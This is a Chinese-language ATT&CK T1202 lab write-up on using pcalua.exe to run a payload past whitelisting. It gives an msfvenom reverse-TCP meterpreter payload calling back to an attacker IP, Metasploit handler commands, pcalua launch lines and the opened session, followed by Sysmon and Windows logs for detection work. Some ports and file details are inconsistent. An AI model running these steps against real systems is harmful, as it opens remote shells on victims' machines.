# T1202-win-间接命令执行-基于Pcalua执行payload(白名单)

## 来自ATT&CK的描述

可以使用各种Windows实用程序来执行命令，而不需要调用cmd。例如，Forfiles、程序兼容性助手（pcalua.exe）、WSL（WindowsSubsystem for Linux）组件以及其他实用程序可以从命令行界面、运行窗口或通过脚本来调用程序和命令的执行。

攻击者可能会滥用这些功能来规避防御，尤其是在破坏检测和/或缓解控制（如组策略）的同时执行任意动作。（这些控制限制/阻止了cmd或恶意负载相关文件扩展名的使用。）

## 测试案例

Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。

说明：Pcalua.exe所在路径已被系统添加PATH环境变量中，因此，Pcalua命令可识别

Windows 7 默认位置：

C:\Windows\System32\pcalua.exe

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7

### 攻击分析

#### 生成payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=6666 -f exe > shell.exe
```

#### MSF配置

```bash
msf5 exploit(multi/handler) > back
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 5555
lport => 5555
msf5 exploit(multi/handler) > exploit
```

#### 靶机执行payload

```cmd
Pcalua -m -a \\192.168.1.119\share\shell.exe #可远程加载

Pcalua -m -a C:\Users\12306Br0\Desktop\a\shell.exe #可本地加载
```

#### 反弹shell

```bash
Msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:6666
[*] Sending stage (180291 bytes) to 192.168.126.149
[*] Meterpreter session 4 opened (192.168.126.146:6666 -> 192.168.126.149:49163) at 2020-04-19 00:12:39 +0800

meterpreter > getuid
Server username: 12306Br0-PC\12306Br0
meterpreter > getpid
Current pid: 2804
```

## 测试留痕

```log
#sysmon日志
EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 16:12:37.744
ProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}
ProcessId: 2148
Image: C:\Windows\System32\pcalua.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Program Compatibility Assistant
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName:
CommandLine: Pcalua  -m -a C:\Users\12306Br0\Desktop\a\shell.exe
CurrentDirectory: C:\Users\12306Br0\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}
LogonId: 0x66ddb
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=280038828C2412F3867DDB22E07759CB26F7D8EA
ParentProcessGuid: {bb1f7c32-26ca-5e9b-0000-00109cdf0d00}
ParentProcessId: 2724
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe"

EventID: 1
Process Create:
RuleName:
UtcTime: 2020-04-18 16:12:37.775
ProcessGuid: {bb1f7c32-26f5-5e9b-0000-0010621a0e00}
ProcessId: 2804
Image: C:\Users\12306Br0\Desktop\a\shell.exe
FileVersion: 2.2.14
Description: ApacheBench command line utility
Product: Apache HTTP Server
Company: Apache Software Foundation
OriginalFileName: ab.exe
CommandLine: "C:\Users\12306Br0\Desktop\a\shell.exe"
CurrentDirectory: C:\Users\12306Br0\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600}
LogonId: 0x66ddb
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C
ParentProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00}
ParentProcessId: 2148
ParentImage: C:\Windows\System32\pcalua.exe
ParentCommandLine: Pcalua  -m -a C:\Users\12306Br0\Desktop\a\shell.exe

#win7安全日志
EventID：4688
进程信息:
新进程 ID: 0x864
新进程名: C:\Windows\System32\pcalua.exe

EventID：4688
进程信息:
新进程 ID: 0xaf4
新进程名: C:\Users\12306Br0\Desktop\a\shell.exe

EventID：5156
应用程序信息:
进程 ID: 2804
应用程序名称: \device\harddiskvolume2\users\12306br0\desktop\a\shell.exe

网络信息:
方向: 出站
源地址: 192.168.126.149
源端口: 49163
目标地址: 192.168.126.146
目标端口: 6666
```

## 检测规则/思路

无具体检测。监控和分析基于主机的检测机制（如Sysmon）中的日志来查看事件，比如查看是否有进程创建事件（创建过程中使用了参数来调用程序/命令/文件和/或生成子进程/网络连接，或者该创建是由这些参数导致的）。

## 参考推荐

MITRE-ATT&CK-T1202

<https://attack.mitre.org/techniques/T1202/>

渗透测试-基于白名单执行payload--Pcalua

<https://blog.csdn.net/qq_17204441/article/details/89881795>
